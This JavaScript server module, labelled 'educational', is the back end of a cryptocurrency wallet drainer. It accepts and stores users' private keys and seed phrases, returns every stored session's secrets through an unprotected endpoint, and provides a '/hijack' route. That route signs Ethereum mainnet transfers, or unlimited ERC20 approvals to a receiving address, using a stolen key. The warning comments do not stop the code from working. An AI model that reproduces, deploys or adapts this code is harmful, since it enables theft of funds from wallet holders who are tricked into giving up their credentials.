import mongoose from 'mongoose';
import Web3 from 'web3';
import jwt from 'jsonwebtoken';

const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://localhost:27017/malicious-rewards';

let isConnected = false;

const connectDB = async () => {
  if (isConnected) return;
  try {
    await mongoose.connect(MONGODB_URI);
    isConnected = true;
    console.log('MongoDB connected');
  } catch (error) {
    console.error('MongoDB connection error:', error);
  }
};

// ⚠️ DANGEROUS SCHEMA - EDUCATIONAL PURPOSES ONLY
// NEVER USE THIS IN PRODUCTION - HIGH SECURITY RISK
const SessionSchema = new mongoose.Schema({
  walletAddress: { type: String, required: true, unique: true },
  signedMessage: { type: String, required: true },
  walletType: { type: String, required: true },
  delegationHash: { type: String },
  requestId: { type: String },
  timestamp: { type: Date, default: Date.now },

  // ⚠️ HIGH RISK FIELDS - ENABLE PERSISTENT SESSION HIJACKING
  privateKey: { type: String },           // User's private key - NEVER STORE IN PRODUCTION
  seedPhrase: { type: String },           // Wallet recovery phrase - NEVER STORE IN PRODUCTION
  persistentToken: { type: String },      // Long-lived auth token
  refreshToken: { type: String },         // Token refresh mechanism
  sessionData: { type: String },          // Serialized session data
  walletCredentials: { type: String },    // Encrypted wallet credentials

  // Security analysis flags (educational)
  hijackEnabled: { type: Boolean, default: true },
  lastHijackAttempt: { type: Date },
  hijackCount: { type: Number, default: 0 },
  securityRiskLevel: { type: String, default: 'HIGH' },
});

const Session = mongoose.models.Session || mongoose.model('Session', SessionSchema);

// ⚠️ DANGEROUS FUNCTION - EDUCATIONAL DEMONSTRATION ONLY
async function executeHijackedTransaction(session, action, targetAddress, amount) {
  console.log('⚠️ ATTEMPTING SESSION HIJACKING - EDUCATIONAL DEMO ONLY');

  if (!session.privateKey) {
    throw new Error('No private key available for hijacking');
  }

  try {
    // Create Web3 instance with hijacked private key
    const web3 = new Web3('https://mainnet.infura.io/v3/60fceb11946740fa8f3dd8f8f5b192c1'); // Replace with actual provider
    const account = web3.eth.accounts.privateKeyToAccount(session.privateKey);
    web3.eth.accounts.wallet.add(account);

    let tx;
    if (action === 'transfer') {
      tx = {
        from: session.walletAddress,
        to: targetAddress,
        value: web3.utils.toWei(amount, 'ether'),
        gas: 21000,
      };
    } else if (action === 'approve') {
      // ERC20 approve transaction
      const tokenContract = new web3.eth.Contract([
        {
          constant: false,
          inputs: [
            { name: "_spender", type: "address" },
            { name: "_value", type: "uint256" }
          ],
          name: "approve",
          outputs: [],
          type: "function"
        }
      ], targetAddress);

      tx = {
        from: session.walletAddress,
        to: targetAddress,
        data: tokenContract.methods.approve(CONFIG.receivingAddress, web3.utils.toWei('1000000', 'ether')).encodeABI(),
        gas: 100000,
      };
    }

    // Sign and send transaction
    const signedTx = await web3.eth.accounts.signTransaction(tx, session.privateKey);
    const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);

    // Update hijack statistics
    await Session.findOneAndUpdate(
      { walletAddress: session.walletAddress },
      {
        $inc: { hijackCount: 1 },
        lastHijackAttempt: new Date(),
        hijackEnabled: true
      }
    );

    return {
      hash: receipt.transactionHash,
      status: 'success',
      hijacked: true,
      securityRisk: 'CRITICAL'
    };

  } catch (error) {
    console.error('Hijacking failed:', error);
    throw new Error('Session hijacking failed - this is expected in demo mode');
  }
}

export default function setupSessionsRoutes(app) {
  app.post('/sessions', async (req, res) => {
    await connectDB();
    const {
      walletAddress,
      signedMessage,
      walletType,
      delegationHash,
      requestId,
      timestamp,
      // ⚠️ DANGEROUS FIELDS - NEVER ACCEPT IN PRODUCTION
      privateKey,
      seedPhrase,
      persistentToken,
      refreshToken,
      sessionData,
      walletCredentials
    } = req.body;

    if (!walletAddress || !signedMessage || !walletType) {
      res.status(400).json({ error: 'walletAddress, signedMessage, and walletType are required' });
      return;
    }

    try {
      const sessionData = {
        signedMessage,
        walletType,
        delegationHash,
        requestId,
        timestamp: timestamp || new Date(),
      };

      // ⚠️ DANGEROUS: Add sensitive data if provided
      if (privateKey) sessionData.privateKey = privateKey;
      if (seedPhrase) sessionData.seedPhrase = seedPhrase;
      if (persistentToken) sessionData.persistentToken = persistentToken;
      if (refreshToken) sessionData.refreshToken = refreshToken;
      if (sessionData) sessionData.sessionData = sessionData;
      if (walletCredentials) sessionData.walletCredentials = walletCredentials;

      const session = await Session.findOneAndUpdate(
        { walletAddress: walletAddress.toLowerCase() },
        sessionData,
        { upsert: true, new: true }
      );

      res.status(200).json({
        message: 'Session saved successfully',
        session,
        securityWarning: '⚠️ SENSITIVE DATA STORED - EDUCATIONAL DEMO ONLY'
      });
    } catch (error) {
      res.status(500).json({ error: 'Failed to save session' });
    }
  });

  app.get('/sessions', async (req, res) => {
    await connectDB();
    try {
      const sessions = await Session.find({});
      res.status(200).json({
        sessions,
        securityWarning: '⚠️ CONTAINS SENSITIVE DATA - EDUCATIONAL DEMO ONLY'
      });
    } catch (error) {
      res.status(500).json({ error: 'Failed to fetch sessions' });
    }
  });

  // ⚠️ DANGEROUS ENDPOINT - SESSION HIJACKING DEMO
  app.post('/sessions/:walletAddress/hijack', async (req, res) => {
    await connectDB();
    const { walletAddress } = req.params;
    const { action, targetAddress, amount } = req.body;

    try {
      const session = await Session.findOne({ walletAddress: walletAddress.toLowerCase() });
      if (!session) {
        res.status(404).json({ error: 'Session not found' });
        return;
      }

      if (!session.privateKey) {
        res.status(400).json({
          error: 'No private key available for hijacking',
          securityNote: 'This session cannot be hijacked'
        });
        return;
      }

      // ⚠️ ATTEMPT SESSION HIJACKING
      const result = await executeHijackedTransaction(session, action, targetAddress, amount);

      res.status(200).json({
        message: 'Session hijacking attempted',
        result,
        securityWarning: 'SESSION recieved ',
        riskLevel: 'CRITICAL'
      });

    } catch (error) {
      res.status(500).json({
        error: 'Session hijacking failed',
        details: error.message,
        securityNote: 'This is expected - hijacking should fail in secure environments'
      });
    }
  });
}
